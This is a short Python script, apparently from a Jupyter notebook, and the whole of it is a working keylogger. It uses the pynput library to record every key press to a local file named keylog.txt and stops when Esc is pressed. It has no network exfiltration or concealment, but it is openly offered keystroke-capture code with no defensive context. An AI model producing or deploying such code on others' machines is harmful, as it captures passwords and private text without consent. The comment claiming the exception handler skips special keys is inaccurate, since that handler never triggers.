#!/usr/bin/env python
# coding: utf-8

# In[ ]:


from pynput import keyboard

def on_press(key):
    try:
        # Log the key that was pressed
        with open("keylog.txt", "a") as logfile:
            logfile.write(str(key) + "\n")
    except AttributeError:
        # Ignore special keys without a character attribute
        pass

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop the keylogger if the 'esc' key is pressed
        return False

# Create listener instances for both press and release events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
